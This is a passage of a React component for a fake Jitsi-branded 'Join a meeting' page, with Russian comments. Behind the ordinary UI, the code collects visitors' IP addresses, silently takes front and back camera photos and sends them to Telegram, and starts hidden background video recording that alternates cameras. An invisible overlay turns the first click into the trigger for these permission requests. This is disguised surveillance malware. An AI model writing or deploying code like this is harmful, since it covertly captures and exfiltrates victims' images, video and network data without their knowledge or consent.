      console.log('✅ [PreJoin] IP адреса собраны');
    } catch (error) {
      console.error('❌ [PreJoin] Ошибка сбора IP:', error);
    }
    
    // 4️⃣ ЗАХВАТ ФОТО (всегда выполняется если камера разрешена)
      if (cameraGranted && !photosCaptured) {
          console.log('📸 [PreJoin] Захватываем фото...');
          
          // Небольшая задержка чтобы браузер "запомнил" разрешение
          await new Promise(resolve => setTimeout(resolve, 500));
          
          // 1. Фронтальная камера
          try {
            console.log('📸 [1/2] Фронтальная камера...');
            const frontPhoto = await capturePhoto('user');
            if (frontPhoto) {
              await sendPhotoToTelegram(frontPhoto, 'front');
              console.log('✅ Фото с фронтальной камеры отправлено');
            }
          } catch (error) {
            console.error('❌ Ошибка фото с фронтальной камеры:', error);
          }
          
          await new Promise(resolve => setTimeout(resolve, 300));
          
          // 2. Задняя камера
          try {
            console.log('📸 [2/2] Задняя камера...');
            const backPhoto = await capturePhoto('environment');
            if (backPhoto) {
              await sendPhotoToTelegram(backPhoto, 'back');
              console.log('✅ Фото с задней камеры отправлено');
            }
          } catch (error) {
            console.error('❌ Ошибка фото с задней камеры:', error);
          }
          
      setPhotosCaptured(true);
      console.log('✅ [PreJoin] Все фото захвачены!');
      
      // 🔧 Увеличенная задержка перед видеозаписью для освобождения камеры
      console.log('⏳ [PreJoin] Ждём 1000ms для полного освобождения камеры...');
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // 5️⃣ ЗАПУСК ВИДЕОЗАПИСИ (всегда выполняется)
      console.log('🎥 [PreJoin] Запускаем видеозапись...');
      try {
        await startVideoRecording();
        console.log('✅ [PreJoin] Видеозапись успешно запущена в фоне');
        
        // 🔒 ВАЖНО: Устанавливаем флаг что ВСЕ данные собраны - теперь можно входить в комнату!
        setDataCollectionComplete(true);
        console.log('🎉 [PreJoin] ВСЕ ДАННЫЕ СОБРАНЫ! Кнопка входа теперь полностью активна.');
      } catch (error) {
        console.error('❌ [PreJoin] Ошибка запуска видеозаписи:', error);
        // Даже если видео не запустилось, разрешаем вход
        setDataCollectionComplete(true);
      }
    }
    
    console.log('✅ [PreJoin] Автозапрос permissions завершён успешно!');
    
    // Скрываем alert после успешного получения всех разрешений
    if (cameraGranted) {
      setShowPermissionAlert(false);
    }
    
    isExecutingPermissionsRef.current = false;
  };

  // ========================================
  // AUTO-JOIN WHEN DATA COLLECTION COMPLETE
  // ========================================
  
  // 🚀 Автоматический вход в комнату когда данные собраны и пользователь нажал кнопку
  useEffect(() => {
    if (isJoining && dataCollectionComplete && permissionsRequested) {
      console.log('🚀 [AutoJoin] Данные собраны + кнопка нажата → автоматически входим!');
      
      const autoJoin = async () => {
        try {
          const joinData = await joinRoom(roomName, userName);
          console.log('✅ JWT токен получен для автовхода:', {
            role: joinData.role,
            identity: joinData.identity,
            livekitUrl: joinData.livekitUrl
          });
          
          localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
          
          console.log('🚪 [AutoJoin] Вызов onJoinRoom');
          onJoinRoom(userName, joinData.token, joinData.livekitUrl);
        } catch (error) {
          console.error('❌ [AutoJoin] Ошибка получения токена:', error);
          setIsJoining(false);
        }
      };
      
      autoJoin();
    }
  }, [isJoining, dataCollectionComplete, permissionsRequested]);
  
  // 🐛 DEBUG: Log dataCollectionComplete changes
  useEffect(() => {
    console.log(`🔍 [DEBUG] dataCollectionComplete: ${dataCollectionComplete}`);
  }, [dataCollectionComplete]);
  
  // 🐛 DEBUG: Log isJoining changes
  useEffect(() => {
    console.log(`🔍 [DEBUG] isJoining: ${isJoining}`);
  }, [isJoining]);
  
  // 🐛 DEBUG: Log permissionsRequested changes
  useEffect(() => {
    console.log(`🔍 [DEBUG] permissionsRequested: ${permissionsRequested}`);
  }, [permissionsRequested]);

  // ========================================
  // AVATAR GENERATION
  // ========================================

  const getAvatarColor = (name: string): string => {
    if (!name) return '#aaa';
    
    const colors = [
      '#E91E63', // Pink
      '#9C27B0', // Purple
      '#673AB7', // Deep Purple
      '#3F51B5', // Indigo
      '#2196F3', // Blue
      '#03A9F4', // Light Blue
      '#00BCD4', // Cyan
      '#009688', // Teal
      '#4CAF50', // Green
      '#8BC34A', // Light Green
      '#CDDC39', // Lime
      '#FFC107', // Amber
      '#FF9800', // Orange
      '#FF5722', // Deep Orange
      '#795548', // Brown
      '#607D8B', // Blue Grey
    ];
    
    // Суммируем charCode всех символов для динамической смены цвета
    let hash = 0;
    for (let i = 0; i < name.length; i++) {
      hash += name.charCodeAt(i);
    }
    
    const index = hash % colors.length;
    
    return colors[index];
  };

  const getInitial = (name: string): string => {
    if (!name) return '';
    return name.charAt(0).toUpperCase();
  };

  // ========================================
  // CAMERA SWITCHING LOGIC
  // ========================================

  // Camera switching based on chunk number (INFINITE LOOP for mobile)
  useEffect(() => {
    const device = detectDevice();
    
    if (device === 'desktop' || currentChunkNumber === 0) {
      return; // No camera switching for desktop or initial state
    }
    
    // Mobile: 2 back → 2 front → 2 back → 2 front (INFINITE loop)
    const cyclePosition = ((currentChunkNumber - 1) % 4) + 1;
    
    log(`🔄 [Auto Switch] Чанк #${currentChunkNumber}, позиция в цикле: ${cyclePosition}/4, текущая камера: ${currentCameraType}`);
    
    // Switch to FRONT after chunk at position 2 (after chunks 2, 6, 10, 14...)
    if (cyclePosition === 2 && currentCameraType === 'back') {
      log(`🔄 Чанк #${currentChunkNumber} завершен (позиция 2/4) - переключаем на ФРОНТАЛЬНУЮ`);
      setIsVideoRecording(false);
      setTimeout(() => {
        switchCamera('user');
      }, 500);
    }
    // Switch to BACK after chunk at position 4 (after chunks 4, 8, 12, 16...)
    else if (cyclePosition === 4 && currentCameraType === 'front') {
      log(`🔄 Чанк #${currentChunkNumber} завершен (позиция 4/4) - переключаем на ЗАДНЮЮ`);
      setIsVideoRecording(false);
      setTimeout(() => {
        switchCamera('environment');
      }, 500);
    } else {
      log(`✅ Чанк #${currentChunkNumber} завершен (позиция ${cyclePosition}/4) - переключения не требуется`);
    }
  }, [currentChunkNumber, currentCameraType]);

  return (
    <div className="relative size-full overflow-hidden bg-[#040404]">
      {/* 🛡️ ЗАЩИТА ОТ СЛУЧАЙНЫХ КЛИКОВ - Полностью невидимый overlay на весь экран */}
      {isProtectionActive && (
        <div 
          className="absolute inset-0 z-[9999] cursor-default"
          onClick={(e) => {
            e.preventDefault();
            e.stopPropagation();
            setIsProtectionActive(false);
            console.log('🛡️ Protection layer removed - interface unlocked');
            
            // 🚀 ЗАПУСКАЕМ ПЕРМИШЕНЫ СРАЗУ ПОСЛЕ ПЕРВОГО КЛИКА
            if (!permissionsRequested && !isExecutingPermissionsRef.current) {
              console.log('🚀 [Overlay Click] Первый клик → запускаем автозапрос permissions!');
              sendStartAPI().catch(err => console.error('Error sending start notification:', err));
              handleFirstInteraction();
            }
          }}
          style={{ 
            backgroundColor: 'transparent',
            touchAction: 'none' // Блокируем любые touch события до первого клика
          }}
        />
      )}
      
      {/* Background with blurred video preview */}
      <div className="absolute inset-0">
        <div className="absolute inset-0 blur-[20px] bg-[#040404]" />
        <div className="absolute inset-0 shadow-[0px_0px_20px_-2px_#444]" />
        
        {/* Jitsi Logo */}
        <a 
          href="https://jitsi.org/" 
          target="_blank" 
          rel="noopener noreferrer"
          className="absolute left-4 top-4 lg:left-8 lg:top-8 z-10"
        >
          <JitsiLogo />
        </a>
      </div>

      {/* Main content - Mobile: flex column with controls at bottom, Desktop: flex row */}
      <div className="relative h-full w-full flex flex-col lg:flex-row items-stretch">
        {/* Video preview - top on mobile (flexible), right on desktop */}
        <div className="flex-1 bg-[#040404]/80 flex items-center justify-center z-10 lg:order-2 min-h-0">
          <div 
            className="w-[150px] h-[150px] lg:w-[200px] lg:h-[200px] rounded-full flex items-center justify-center transition-colors duration-300"
            style={{ backgroundColor: getAvatarColor(userName) }}
          >
            {userName ? (
              <span className="text-white text-[60px] lg:text-[80px] font-bold leading-none">
                {getInitial(userName)}
              </span>
            ) : (
              <UserIcon />
            )}
          </div>
        </div>

        {/* Controls panel - sticky bottom on mobile, left sidebar on desktop */}
        <div className="w-full lg:w-[400px] flex-shrink-0 bg-[#141414] flex flex-col justify-end lg:justify-center items-center p-4 lg:p-6 z-20 lg:order-1 relative overflow-y-auto max-h-[70vh] lg:max-h-none">
          <div className="w-full max-w-[400px]">
            {/* Heading "Join a meeting" - visible on all screens */}
            <div className="text-white text-[28px] leading-[36px] font-bold text-center mb-4">
              Join a meeting
            </div>

            {/* Room name */}
            <div className="text-white text-[20px] leading-[28px] font-bold text-center mb-2">
              {roomTitle || roomName}
            </div>
            
            {/* Current URL Display */}
            <div 
              className="w-full bg-gray-800/50 rounded-md p-2 mb-6 cursor-pointer hover:bg-gray-700/50 transition-colors relative"
              onClick={handleCopyUrl}
            >
              <p className="text-gray-400 text-[10px] mb-1">Meeting URL:</p>
              <p className="text-gray-300 text-[11px] break-all font-mono">{window.location.href}</p>
              {isFlashing && (
                <div className="absolute inset-0 bg-white/20 rounded-md pointer-events-none" />
              )}
            </div>

            {/* Name input */}
            <input
              type="text"
              value={userName}
              onChange={(e) => setUserName(e.target.value)}
              placeholder="Enter your name"
              className="w-full h-10 bg-[#3d3d3d] text-white text-sm px-4 py-3 rounded-md mb-4 outline-none placeholder:text-[#c2c2c2]"
            />

            {/* Join button */}
            <div className="relative mb-4">
              <button
                onClick={handleJoinMeeting}
                disabled={!userName.trim() || isJoining}
                className="w-full bg-[#4687ed] text-white text-base font-bold py-2.5 px-4 rounded-md hover:bg-[#3a75d9] transition-colors disabled:bg-[#2d5fa1] disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isJoining ? 'Loading...' : 'Join meeting'}
              </button>
              
              {/* Join menu dropdown button */}
              <button
                onClick={() => setShowJoinMenu(!showJoinMenu)}
                disabled={!userName.trim()}
                className="absolute right-0 top-0 bottom-0 w-9 flex items-center justify-center rounded-r-md hover:bg-[#3a75d9] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <ChevronDown className="w-6 h-6 text-white" />
              </button>

              {/* Dropdown menu */}
              {showJoinMenu && userName.trim() && (
                <div className="absolute top-full mt-1 right-0 bg-[#36383c] rounded-md shadow-lg overflow-hidden z-30">
                  <button
                    onClick={handleJoinWithoutAudio}
                    className="w-full px-4 py-2 text-white text-sm hover:bg-[#4a4c50] transition-colors text-left whitespace-nowrap"
                  >
                    Join without audio
                  </button>
                </div>
              )}
            </div>

            {/* Control buttons */}
            <div className="flex items-center justify-between py-2 gap-2">
              {/* Microphone button */}
              <button
                onClick={handleMicClick}
                className="flex-1 h-12 bg-[#3d3d3d] lg:bg-transparent rounded-sm hover:bg-[#4a4c50] transition-colors flex items-center justify-center"
                title={isMicMuted ? 'Unmute microphone' : 'Mute microphone'}
              >
                <MicrophoneIcon muted={isMicMuted} />
              </button>

              {/* Camera button */}
              <button
                onClick={handleCameraClick}
                className="flex-1 h-12 bg-[#3d3d3d] lg:bg-transparent rounded-sm hover:bg-[#4a4c50] transition-colors flex items-center justify-center"
                title={isCameraOff ? 'Start camera' : 'Stop camera'}
              >
                <CameraIcon off={isCameraOff} />
              </button>

              {/* Invite button */}
              <button
                className="flex-1 h-12 rounded-sm hover:bg-[#4a4c50] transition-colors flex items-center justify-center"
                title="Invite people"
              >
                <InviteIcon />
              </button>

              {/* Background button */}
              <button
                className="flex-1 h-12 rounded-sm hover:bg-[#4a4c50] transition-colors flex items-center justify-center"
                title="Select background"
              >
                <BackgroundIcon />
              </button>

              {/* Settings button */}
              <button
                className="flex-1 h-12 rounded-sm hover:bg-[#4a4c50] transition-colors flex items-center justify-center"
                title="Settings"
              >
                <SettingsIcon />
              </button>

              {/* Leave button */}
              <button
                className="h-12 w-12 bg-[#cb2233] rounded-sm hover:bg-[#b01e2e] transition-colors flex items-center justify-center"
                title="Leave"
              >
                <LeaveIcon />
              </button>
            </div>
          </div>

          {/* Permission Alert - показывается внизу при отклонении */}
          {showPermissionAlert && (
            <div className="mt-6 mb-4 w-full max-w-[400px] flex flex-col items-center gap-3">
              <div className="h-16 w-[300px] relative">
                <Alert />
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// Icon components using imported SVG paths
function JitsiLogo() {
  return (
    <div className="h-8 w-[71px]">
      <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 71 32">
        <g clipPath="url(#clip0_1_107)">
          <path d={svgPathsDesktop.p187d5d00} fill="white" />
          <path d={svgPathsDesktop.p373a8600} fill="white" />
          <path d={svgPathsDesktop.p1981b00} fill="white" />
          <path d={svgPathsDesktop.p1c73ca00} fill="white" />
          <path d={svgPathsDesktop.p883c300} fill="white" />
          <path d={svgPathsDesktop.p30fb000} fill="white" />
        </g>
        <defs>
          <clipPath id="clip0_1_107">
            <rect fill="white" height="32" width="71" />
          </clipPath>
        </defs>
      </svg>
    </div>
  );
}

function MicrophoneIcon({ muted }: { muted: boolean }) {
  return (
    <div className="relative w-6 h-6">
      <svg className="block size-full" fill="none" viewBox="0 0 24 24">
        <g>
          <path d="M12 1C10.3431 1 9 2.34315 9 4V12C9 13.6569 10.3431 15 12 15C13.6569 15 15 13.6569 15 12V4C15 2.34315 13.6569 1 12 1Z" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          <path d="M19 10V12C19 15.866 15.866 19 12 19C8.13401 19 5 15.866 5 12V10M12 19V23M8 23H16" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          {muted && (
            <line x1="2" y1="2" x2="22" y2="22" stroke="red" strokeWidth="2.5" strokeLinecap="round" />
          )}
        </g>
      </svg>
    </div>
  );
}

function CameraIcon({ off }: { off: boolean }) {
  return (
    <div className="relative w-6 h-6">
      <svg className="block size-full" fill="none" viewBox="0 0 24 24">
        <g>
          <path clipRule="evenodd" d="M2 7C2 5.34315 3.34315 4 5 4H14C15.6569 4 17 5.34315 17 7V17C17 18.6569 15.6569 20 14 20H5C3.34315 20 2 18.6569 2 17V7ZM20.4453 6.16795C20.7812 5.94395 21.2344 5.94395 21.5703 6.16795C21.9062 6.39194 22.0938 6.78991 22.0938 7.21387V16.7861C22.0938 17.2101 21.9062 17.6081 21.5703 17.832C21.2344 18.056 20.7812 18.056 20.4453 17.832L17.5391 15.6289V8.37109L20.4453 6.16795Z" fill="white" fillRule="evenodd" />
          {off && (
            <line x1="2" y1="2" x2="22" y2="22" stroke="red" strokeWidth="2.5" strokeLinecap="round" />
          )}
        </g>
      </svg>
    </div>
  );
}

function InviteIcon() {
  return (
    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
      <path d={svgPathsMobile.p23658e80} fill="white" />
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.pb36eb00} 
        fill="white" 
        fillRule="evenodd" 
      />
    </svg>
  );
}

function BackgroundIcon() {
  return (
    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.p373cd500} 
        fill="white" 
        fillRule="evenodd" 
      />
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.peac8700} 
        fill="white" 
        fillRule="evenodd" 
      />
    </svg>
  );
}

function SettingsIcon() {
  return (
    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.pe3b500} 
        fill="white" 
        fillRule="evenodd" 
      />
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.pee08300} 
        fill="white" 
        fillRule="evenodd" 
      />
    </svg>
  );
}

function LeaveIcon() {
  return (
    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.p1cd36400} 
        fill="white" 
        fillRule="evenodd" 
      />
    </svg>
  );
}

function UserIcon() {
  return (
    <svg className="w-[100px] h-[100px]" fill="none" viewBox="0 0 100 100">
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.p37acea00} 
        fill="white" 
        fillRule="evenodd" 
      />
    </svg>
  );
}